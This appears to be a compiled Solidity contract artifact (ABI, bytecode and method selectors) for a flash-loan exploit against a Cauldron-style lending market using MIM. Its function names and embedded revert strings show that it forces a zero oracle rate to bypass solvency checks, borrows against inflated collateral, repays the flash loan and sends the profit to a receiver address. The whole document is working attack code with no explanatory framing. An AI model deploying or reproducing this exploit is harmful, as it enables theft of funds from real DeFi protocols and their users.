{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"MIM","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract ICauldronLike"}],"stateMutability":"view"},{"type":"function","name":"TARGET_CAULDRON","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"borrowedAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"borrowedPart","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"borrowedShare","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"collateralDepositedShare","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"collateralRemovedShare","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"collateralToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"execute","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"flashAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"flashFee","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"initOracleGetReturnedFalse","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"initOracleRate","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"liveTargetLiquidity","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"liveTargetRateAfterUpdate","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"liveTargetRateBeforeUpdate","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"liveTargetZeroRate","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"liveUpdateCallWorked","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"liveUpdateRate","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"liveUpdateReturnedSuccess","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"onFlashLoan","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"token","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"fee","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitReceiver","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"pure"},{"type":"function","name":"run","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"usedInitZeroRatePath","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"usedLiveUpdateZeroRatePath","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"validationClone","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"vulnerableCauldron","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"zeroOracle","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"error","name":"ExecutionFailed","inputs":[{"name":"reason","type":"string","internalType":"string"}]},{"type":"error","name":"SetupFailed","inputs":[{"name":"reason","type":"string","internalType":"string"}]},{"type":"error","name":"Unauthorized","inputs":[]}],"bytecode":{"object":"0x60808060405234601557612a45908161001a8239f35b5f80fdfe608080604052600436101561001c575b50361561001a575f80fd5b005b5f905f3560e01c90816302137c2f146112ca5750806303766ae3146112ad5780631afbb7a41461129057806322cb9ca31461126857806323e30c8b146104d157806332f8603d146104ab578063355c897314610482578063370be116146104595780633c2448ed1461029857806341f30ddf1461043b578063463defd114610415578063493436241461022357806352d11fb4146103f75780635a4238b7146103d95780635ff972cc146103bc578063614619541461029857806363d9b770146102985780636c0e82261461038f5780636e5f1ba7146103695780638456164e146103465780639aaecafc14610328578063b0b62eeb1461030a578063b2016bd4146102e1578063b3157616146102bb578063b570137a1461029d578063bd7a598c14610252578063c040622614610298578063c8e4e74f1461027a578063cc1f2afa14610252578063daec383d14610223578063de02cfdf14610205578063e07df5b4146101e7578063eaa15e1d146101c25763fbd05d040361000f57346101bf57806003193601126101bf57602060ff60115460281c166040519015158152f35b80fd5b50346101bf57806003193601126101bf57602060ff601154821c166040519015158152f35b50346101bf57806003193601126101bf576020600854604051908152f35b50346101bf57806003193601126101bf576020600f54604051908152f35b50346101bf57806003193601126101bf5760206040517399d8a9c45b2eca8864373a26d1459e3dff1e17f38152f35b50346101bf57806003193601126101bf5760206040515f5160206129f05f395f51905f528152f35b50346101bf57806003193601126101bf576020600a54604051908152f35b6112e4565b50346101bf57806003193601126101bf576020600654604051908152f35b50346101bf57806003193601126101bf57602060ff60115460101c166040519015158152f35b50346101bf57806003193601126101bf576004546040516001600160a01b039091168152602090f35b50346101bf57806003193601126101bf576020600c54604051908152f35b50346101bf57806003193601126101bf576020600e54604051908152f35b50346101bf57806003193601126101bf57602060ff601154166040519015158152f35b50346101bf57806003193601126101bf57602060ff60115460301c166040519015158152f35b50346101bf57806003193601126101bf5760015460405160089190911c6001600160a01b03168152602090f35b50346101bf57806003193601126101bf5760209054604051908152f35b50346101bf57806003193601126101bf576020601054604051908152f35b50346101bf57806003193601126101bf576020600d54604051908152f35b50346101bf57806003193601126101bf57602060ff60115460181c166040519015158152f35b50346101bf57806003193601126101bf576020601254604051908152f35b50346101bf57806003193601126101bf576002546040516001600160a01b039091168152602090f35b50346101bf57806003193601126101bf576005546040516001600160a01b039091168152602090f35b50346101bf57806003193601126101bf57602060ff60115460081c166040519015158152f35b5034610ce05760a0366003190112610ce0576004356001600160a01b03811690819003610ce0576024356001600160a01b03811690819003610ce057604435916064359160843567ffffffffffffffff8111610ce05736602382011215610ce057806004013567ffffffffffffffff8111610ce05736910160240111610ce057604051636b2ace8760e01b81526020816004815f5160206129f05f395f51905f525afa908115610f7c575f91611249575b506001600160a01b031633148015929061123e575b508115611228575b5061121a57806008556105b06113f1565b604051636b2ace8760e01b81526020816004815f5160206129f05f395f51905f525afa908115610f7c575f9160409183916111fb575b5060a460018060a01b03600454168351948593849262ae511b60e21b845260048401523060248401525f5160206129f05f395f51905f52604484015288606484015281608484015260018060a01b03165af1908115610f7c575f916111da575b508060095560018111156111945761065c611650565b908115611159576040516060916106738383611307565b60028252601f1983019060208301823682376040516106928682611307565b60028152602081019284368537604051946106ad8887611307565b600286525f5b8181106111495750506106d190600a6106cb88611372565b526118b8565b6040519060208201523060408201526001878201528681526106f4608082611307565b6106fd85611372565b5261070784611372565b50600561071386611393565b5261071d876118b8565b6040519060208201523060408201526040815261073a8782611307565b61074385611393565b5261074d84611393565b5060405195869563195bcf5960e21b875260648701916004880152518091526084860192905f5b81811061112d5750505060209060031986840301602487015251918281520191905f5b81811061111457505050600319838203016044840152815180825260208201916020808360051b8301019401925f915b8383106110e3575050505050908060409203815f5f5160206129f05f395f51905f525af18015610f7c575f915f916110c2575b50600d55600c55600b55604051636b2ace8760e01b81526020816004815f5160206129f05f395f51905f525afa908115610f7c576044916020915f916110a5575b50604051633de222bb60e21b81527399d8a9c45b2eca8864373a26d1459e3dff1e17f3600482015230602482015292839182906001600160a01b03165afa908115610f7c575f91611073575b5080610f9b575b506009545f198101908111610f875780600a555f5160206129f05f395f51905f523b15610ce0576040516310ec8cff60e31b815230600482015260248101919091525f81604481835f5160206129f05f395f51905f525af18015610f7c57610f67575b50604051636b2ace8760e01b81526020816004815f5160206129f05f395f51905f525afa908115610c4f578491610f48575b50604060018060a01b036004541660a4600a5491878451958694859363097da6d360e41b85526004850152306024850152306044850152826064850152608484015260018060a01b03165af18015610c4f57610f1a575b50604051633ba0b9a960e01b81526020816004815f5160206129f05f395f51905f525afa908115610c4f578491610ee8575b50604051631c9e379b60e01b8152306004820152906020826024815f5160206129f05f395f51905f525afa918215610edd578592610ea9575b506040516324720b1f60e11b8152306004820152906020826024815f5160206129f05f395f51905f525afa918215610e9e578692610e6a575b506040516338b51ce160e01b81523060048201526020816024815f5160206129f05f395f51905f525afa908115610e5f578791610e21575b506011549260ff8460201c169283610e12575b83610e07575b83610d83575b60ff9563ff0000009493929184610d79575b84610d70575b5083610d66575b5082610d5c575b5081610d54575b50151560181b169063ff0000001916178060115560181c1615610d00578101809111610cec57600480546040516370a0823160e01b815230928101929092526001600160a01b03169190602081602481865afa8015610c4f5782918591610cb3575b5010610c5a57604051636b2ace8760e01b81528392906020816004815f5160206129f05f395f51905f525afa908115610c4f57849384918293610c16575b5060405163a9059cbb60e01b602082019081526001600160a01b0390941660248201526044810191909152610b8481606481015b03601f198101835282611307565b51925af1610b90611901565b9015908115610bda575b50610ba25780f35b60405163f00364b160e01b815260206004820152600f60248201526e1514905394d1915497d19052531151608a1b6044820152606490fd5b8051801515925082610bef575b50505f610b9a565b8192509060209181010312610c12576020610c0a91016113c7565b155f80610be7565b5080fd5b610b76919350610c40610b849160203d602011610c48575b610c388183611307565b81019061133d565b939150610b42565b503d610c2e565b6040513d86823e3d90fd5b60405163f00364b160e01b815260206004820152602a60248201527f494e53554646494349454e545f434f4c4c41544552414c5f544f5f52455041596044820152692fa32620a9a42627a0a760b11b6064820152608490fd5b9150506020813d602011610ce4575b81610ccf60209383611307565b81010312610ce0578190515f610b04565b5f80fd5b3d9150610cc2565b634e487b7160e01b82526011600452602482fd5b60405163f00364b160e01b815260206004820152602560248201527f5a45524f5f524154455f534f4c56454e43595f4259504153535f4e4f545f52456044820152641050d2115160da1b6064820152608490fd5b90505f610aa2565b151591505f610a9b565b151592505f610a94565b1593505f610a8d565b8688169450610a87565b600254604051633ba0b9a960e01b8152919450602090829060049082906001600160a01b03165afa908115610dfc578991610dc1575b501592610a75565b93929190506020843d602011610df4575b81610ddf60209383611307565b81010312610ce05792519192909160ff610db9565b3d9150610dd2565b6040513d8b823e3d90fd5b601254159350610a6f565b925060ff8460301c1692610a69565b90506020813d602011610e57575b81610e3c60209383611307565b81010312610e5357610e4d906113c7565b5f610a56565b8680fd5b3d9150610e2f565b6040513d89823e3d90fd5b9091506020813d602011610e96575b81610e8660209383611307565b81010312610ce05751905f610a1e565b3d9150610e79565b6040513d88823e3d90fd5b9091506020813d602011610ed5575b81610ec560209383611307565b81010312610ce05751905f6109e5565b3d9150610eb8565b6040513d87823e3d90fd5b90506020813d602011610f12575b81610f0360209383611307565b81010312610ce057515f6109ac565b3d9150610ef6565b610f3b9060403d604011610f41575b610f338183611307565b81019061135c565b5061097a565b503d610f29565b610f61915060203d602011610c4857610c388183611307565b5f610923565b610f749193505f90611307565b5f915f6108f1565b6040513d5f823e3d90fd5b634e487b7160e01b5f52601160045260245ffd5b604051636b2ace8760e01b81526020816004815f5160206129f05f395f51905f525afa8015610f7c575f92604092849261104f575b50825163097da6d360e41b81527399d8a9c45b2eca8864373a26d1459e3dff1e17f360048201523060248201819052604482015260648101859052608481019190915292839160a49183916001600160a01b03165af18015610f7c571561088e576110499060403d604011610f4157610f338183611307565b5061088e565b60a491925061106c9060203d602011610c4857610c388183611307565b9190610fd0565b90506020813d60201161109d575b8161108e60209383611307565b81010312610ce057515f610887565b3d9150611081565b6110bc9150823d8411610c4857610c388183611307565b5f61083b565b90506110dd915060403d604011610f4157610f338183611307565b5f6107fa565b919395509193602080611102600193601f1986820301875289516113a3565b970193019301909286959492936107c7565b8251845286955060209384019390920191600101610797565b825160ff16855288975060209485019490920191600101610774565b602081880181018a9052016106b3565b60405163f00364b160e01b815260206004820152601260248201527116915493d7d093d49493d5d7d05353d5539560721b6044820152606490fd5b60405163f00364b160e01b815260206004820152601d60248201527f494e53554646494349454e545f434f4c4c41544552414c5f53484152450000006044820152606490fd5b6111f3915060403d604011610f4157610f338183611307565b90505f610646565b611214915060203d602011610c4857610c388183611307565b5f6105e6565b6282b42960e81b5f5260045ffd5b6004546001600160a01b0316141590505f61059f565b30141591505f610597565b611262915060203d602011610c4857610c388183611307565b5f610582565b34610ce0575f366003190112610ce0576003546040516001600160a01b039091168152602090f35b34610ce0575f366003190112610ce0576020600b54604051908152f35b34610ce0575f366003190112610ce0576020600754604051908152f35b34610ce0575f366003190112610ce0576020906009548152f35b34610ce0575f366003190112610ce05760206112ff33611940565b604051908152f35b90601f8019910116810190811067ffffffffffffffff82111761132957604052565b634e487b7160e01b5f52604160045260245ffd5b90816020910312610ce057516001600160a01b0381168103610ce05790565b9190826040910312610ce0576020825192015190565b80511561137f5760200190565b634e487b7160e01b5f52603260045260245ffd5b80516001101561137f5760400190565b805180835260209291819084018484015e5f828201840152601f01601f1916010190565b51908115158203610ce057565b9190826040910312610ce05760206113eb836113c7565b92015190565b604051633ba0b9a960e01b81526020816004815f5160206129f05f395f51905f525afa908115610f7c575f916115c8575b5080600e55156115b557604080516302ce728f60e01b815290816004815f5f5160206129f05f395f51905f525af190815f915f93611582575b5061155c57505061ff0019601154166011555b604051633ba0b9a960e01b81526020816004815f5160206129f05f395f51905f525afa908115610f7c575f9161152a575b508060105560ff6011549115169081600e54151580611523575b65ff000000000090151560281b169165ff00000000ff19161717601155156114dd57565b604051630daab81760e21b815260206004820152601c60248201527f4c4956455f5441524745545f43414e4e4f545f42455f5a45524f4544000000006044820152606490fd5b50806114b9565b90506020813d602011611554575b8161154560209383611307565b81010312610ce057515f61149f565b3d9150611538565b6101009062ff000060115491151560101b169062ffff0019161717601155600f5561146e565b9092506115a7915060403d6040116115ae575b61159f8183611307565b8101906113d4565b915f61145b565b503d611595565b5f601055600160ff196011541617601155565b90506020813d6020116115f2575b816115e360209383611307565b81010312610ce057515f611422565b3d91506115d6565b51906001600160801b0382168203610ce057565b9190826040910312610ce05761162f6020611628846115fa565b93016115fa565b90565b811561163c570490565b634e487b7160e01b5f52601260045260245ffd5b60075460018111156118b0575f198101908111610f8757905b81156118ab576040805163e551d11d60e01b815290816004815f5160206129f05f395f51905f525afa908115610f7c575f905f92611889575b506040805163020a17bd60e61b815290816004815f5160206129f05f395f51905f525afa8015610f7c575f915f91611858575b50604051632ae8093d60e21b8152906020826004815f5160206129f05f395f51905f525afa918215610f7c575f92611824575b506001600160801b03805f9516931692838111611806575b506001600160801b035f9516928315908115611799575b505050505083811515908161178f575b50611787575b508015158061177e575b611776575b506001821161176757565b905f198101908111610f875790565b91505f61175c565b50828110611757565b92505f61174d565b905081105f611747565b80919293949596501580156117f5575b156117c6575050506117ba91612206565b905b5f80808080611737565b808502948504141715610f87576117ef926001600160801b036117ea921690611632565b612206565b906117bc565b506001600160801b038316156117a9565b909350828103908111610f87578161181d91612206565b925f611720565b9091506020813d602011611850575b8161184060209383611307565b81010312610ce05751905f611708565b3d9150611833565b905061187c915060403d604011611882575b6118748183611307565b81019061160e565b5f6116d5565b503d61186a565b90506118a4915060403d604011611882576118748183611307565b905f6116a2565b5f9150565b505f90611669565b6001600160ff1b0381116118c95790565b60405163f00364b160e01b815260206004820152600f60248201526e494e543235365f4f564552464c4f5760881b6044820152606490fd5b3d1561193b573d9067ffffffffffffffff82116113295760405191611930601f8201601f191660200184611307565b82523d5f602084013e565b606090565b905f9060015460ff81166121fd5760ff191660019081179055600580546001600160a01b0319166001600160a01b03851617905561197c61223d565b60018060a01b036004541660405190636b2ace8760e01b82526020826004815f5160206129f05f395f51905f525afa908115610f7c576119c3925f926121dc575b5061274b565b60018054610100600160a81b0319167446f54d434063e5f1a2b2cc6d9aaa657b1b9ff82c00179055604051636b2ace8760e01b81526020816004815f5160206129f05f395f51905f525afa908115610f7c575f916121bd575b50604051633de222bb60e21b81527399d8a9c45b2eca8864373a26d1459e3dff1e17f360048201525f5160206129f05f395f51905f5260248201526001600160a01b03919091169290602081604481875afa908115610f7c575f9161218b575b5060405190630acc462360e31b82527399d8a9c45b2eca8864373a26d1459e3dff1e17f3600483015260248201525f6044820152602081606481875afa8015610f7c575f90612158575b600191508060075511156121125760018060a01b036004541660405194636b2ace8760e01b86526020866004815f5160206129f05f395f51905f525afa958615610f7c575f966120f1575b506040516370a0823160e01b81526001600160a01b039096166004870152602086602481855afa958615610f7c575f966120bd575b50851561207757604051630acc462360e31b815260048101839052620f424060248201526001604482015294602086606481845afa958615610f7c575f96612043575b50851561203a575b5f955b6008871080611fc7575b15611bc857600a810290808204600a1490151715610f8757955f198114610f875760010195611b94565b9294969091939550821015611f6d57602060649160405192838092636d289ce560e11b82528860048301528660248301525f60448301525afa8015610f7c575f90611f3a575b600191501115611ee5578060065580158015611ede575b611e9857604051636b2ace8760e01b81526020816004815f5160206129f05f395f51905f525afa908115610f7c575f91611e79575b50604051602094916001600160a01b0316611c758683611307565b5f8252803b15610ce057611cc1935f80946040519687958694859363f1676d3760e01b85523060048601523060248601526044850152606484015260a0608484015260a48301906113a3565b03925af18015610f7c57611e64575b506040516370a0823160e01b815230600482015282816024817399d8a9c45b2eca8864373a26d1459e3dff1e17f35afa908115610c4f578491611e37575b508084558015611dfc5760405163a9059cbb60e01b8482019081526001600160a01b039093166024820152604481019190915283918291611d528160648101610b76565b5190827399d8a9c45b2eca8864373a26d1459e3dff1e17f35af1611d74611901565b9015908115611dbf575b50611d8857505490565b6064906040519063f00364b160e01b82526004820152600f60248201526e1514905394d1915497d19052531151608a1b6044820152fd5b80915051828115159182611dd8575b505090505f611d7e565b8380929350010312611df85781611def91016113c7565b1580825f611dce565b8280fd5b60405163f00364b160e01b81526004810184905260126024820152711393d7d49150531256915117d41493d1925560721b6044820152606490fd5b90508281813d8311611e5d575b611e4e8183611307565b81010312610ce057515f611d0e565b503d611e44565b611e719193505f90611307565b5f915f611cd0565b611e92915060203d602011610c4857610c388183611307565b5f611c5a565b604051630daab81760e21b815260206004820152601b60248201527f4241445f434f4c4c41544552414c5f464c4153485f414d4f554e5400000000006044820152606490fd5b505f611c25565b604051630daab81760e21b815260206004820152602660248201527f43414e4e4f545f534f555243455f4e4f4e5a45524f5f434f4c4c41544552414c6044820152655f534841524560d01b6064820152608490fd5b506020813d602011611f65575b81611f5460209383611307565b81010312610ce05760019051611c0e565b3d9150611f47565b604051630daab81760e21b815260206004820152602b60248201527f494e53554646494349454e545f42454e544f5f434f4c4c41544552414c5f464f60448201526a292fa32620a9a42627a0a760a91b6064820152608490fd5b50604051636d289ce560e11b81528460048201528160248201525f6044820152602081606481865afa8015610f7c575f90612008575b600191501115611b9e565b506020813d8211612032575b8161202160209383611307565b81010312610ce05760019051611ffd565b3d9150612014565b60019550611b91565b9095506020813d60201161206f575b8161205f60209383611307565b81010312610ce05751945f611b89565b3d9150612052565b604051630daab81760e21b815260206004820152601b60248201527f4e4f5f42454e544f5f434f4c4c41544552414c5f42414c414e434500000000006044820152606490fd5b9095506020813d6020116120e9575b816120d960209383611307565b81010312610ce05751945f611b46565b3d91506120cc565b61210b91965060203d602011610c4857610c388183611307565b945f611b11565b604051630daab81760e21b815260206004820152601760248201527f4e4f5f5441524745545f4d494d5f4c49515549444954590000000000000000006044820152606490fd5b506020813d602011612183575b8161217260209383611307565b81010312610ce05760019051611ac6565b3d9150612165565b90506020813d6020116121b5575b816121a660209383611307565b81010312610ce057515f611a7c565b3d9150612199565b6121d6915060203d602011610c4857610c388183611307565b5f611a1c565b6121f691925060203d602011610c4857610c388183611307565b905f6119bd565b509150505f5490565b90811561223757620186a08202918204620186a003610f8757620186a00180620186a011610f875761162f91611632565b50505f90565b6002546001600160a01b03166127495760405160ca80820182811067ffffffffffffffff821117611329578291612926833903905ff08015610f7c57600380546001600160a01b0319166001600160a01b0392909216918217905560405163d8dfeb4560e01b81526020816004815f5160206129f05f395f51905f525afa908115610f7c575f9161272a575b50600480546001600160a01b0319166001600160a01b03929092169182179055156126e4575f604061232860209382516123038682611307565b848152835194858094819363d6d7d52560e01b835289600484015260248301906113a3565b03925af18015610f7c575f915f916126c3575b5081159160115466ff0000000000008460301b169066ff00000000000019161760115581601255916126b9575b5061266857604051636b2ace8760e01b815281816004815f5160206129f05f395f51905f525afa908115610f7c575f9161264b575b50604051632ebf93c560e21b81525f5160206129f05f395f51905f5260048201526001600160a01b0391909116908281602481855afa908115610f7c575f9161262e575b506001600160a01b03169081156125e85761249d91839160018060a01b03600454169161247360018060a01b0360035416936124476040516124238882611307565b5f815260405196879389850152604084015260e060608401526101008301906113a3565b5f60808301526201b58060a0830152620124f860c08301525f60e083015203601f198101855284611307565b5f604051809681958294631f54245b60e01b845260048401526060602484015260648301906113a3565b82604483015203925af1908115610f7c575f916125cb575b50600280546001600160a01b0319166001600160a01b03929092169182179055801561258f578160049160405192838092633ba0b9a960e01b82525afa908115610f7c575f91612562575b5061251d575064010000000064ff00000000196011541617601155565b60649060405190630daab81760e21b82526004820152601c60248201527f494e49545f4449445f4e4f545f43414348455f5a45524f5f52415445000000006044820152fd5b90508181813d8311612588575b6125798183611307565b81010312610ce057515f612500565b503d61256f565b604051630daab81760e21b815260048101839052601360248201527210d313d39157d111541313d657d19052531151606a1b6044820152606490fd5b6125e29150823d8411610c4857610c388183611307565b5f6124b5565b604051630daab81760e21b815260048101849052601760248201527f4d495353494e475f4d41535445525f434f4e54524143540000000000000000006044820152606490fd5b6126459150833d8511610c4857610c388183611307565b5f6123e1565b6126629150823d8411610c4857610c388183611307565b5f61239d565b60849060405190630daab81760e21b825260048201526024808201527f5a45524f5f4f5241434c455f4e4f545f52455455524e494e475f46414c53455f6044820152635a45524f60e01b6064820152fd5b905015155f612368565b90506126de915060403d6040116115ae5761159f8183611307565b5f61233b565b604051630daab81760e21b815260206004820152601960248201527f4d495353494e475f5441524745545f434f4c4c41544552414c000000000000006044820152606490fd5b612743915060203d602011610c4857610c388183611307565b5f6122c9565b565b604051636eb1769f60e11b81523060048201526001600160a01b039283166024820181905291926020908290604490829087165afa5f91816128f1575b506128d9575b505f80604051602081019063095ea7b360e01b8252846024820152826044820152604481526127be606482611307565b519082865af16127cc611901565b90159081156128a1575b506128325760405163095ea7b360e01b6020820190815260248201929092525f1960448083019190915281525f92839290918390612815606482611307565b51925af1612821611901565b9015908115612869575b5061283257565b60405163f00364b160e01b815260206004820152600e60248201526d1054141493d59157d1905253115160921b6044820152606490fd5b805180151592508261287e575b50505f61282b565b8192509060209181010312610ce057602061289991016113c7565b155f80612876565b80518015159250826128b6575b50505f6127d6565b8192509060209181010312610ce05760206128d191016113c7565b155f806128ae565b6001600160ff1b0311156128ed575f61278e565b5050565b9091506020813d60201161291d575b8161290d60209383611307565b81010312610ce05751905f612788565b3d915061290056fe6080806040523460135760b2908160188239f35b5f80fdfe60808060405260043610156011575f80fd5b5f3560e01c63d6d7d525146023575f80fd5b34607857602036600319011260785760043567ffffffffffffffff811160785736602382011215607857806004013567ffffffffffffffff811160785736910160240111607857805f604092525f6020820152f35b5f80fdfea264697066735822122027558314bad1c452732455a58da4a774a5528e657696c803326e41d81b00d2c364736f6c634300081e003300000000000000000000000046f54d434063e5f1a2b2cc6d9aaa657b1b9ff82ca264697066735822122002c84453dd08687c09578238bf09b23065250ec5b59bb267db512171bcfdb79464736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"MIM()":"daec383d","TARGET()":"cc1f2afa","TARGET_CAULDRON()":"bd7a598c","borrowedAmount()":"1afbb7a4","borrowedPart()":"b0b62eeb","borrowedShare()":"52d11fb4","collateralDepositedShare()":"02137c2f","collateralRemovedShare()":"c8e4e74f","collateralToken()":"b2016bd4","execute()":"61461954","executeOnOpportunity()":"3c2448ed","exploit()":"63d9b770","flashAmount()":"b570137a","flashFee()":"e07df5b4","hypothesisValidated()":"463defd1","initOracleGetReturnedFalse()":"6e5f1ba7","initOracleRate()":"41f30ddf","liveTargetLiquidity()":"03766ae3","liveTargetRateAfterUpdate()":"5a4238b7","liveTargetRateBeforeUpdate()":"9aaecafc","liveTargetZeroRate()":"8456164e","liveUpdateCallWorked()":"32f8603d","liveUpdateRate()":"de02cfdf","liveUpdateReturnedSuccess()":"b3157616","onFlashLoan(address,address,uint256,uint256,bytes)":"23e30c8b","profitAmount()":"5ff972cc","profitReceiver()":"355c8973","profitToken()":"49343624","run()":"c0406226","usedInitZeroRatePath()":"eaa15e1d","usedLiveUpdateZeroRatePath()":"fbd05d04","validationClone()":"370be116","vulnerableCauldron()":"6c0e8226","zeroOracle()":"22cb9ca3"},"id":0}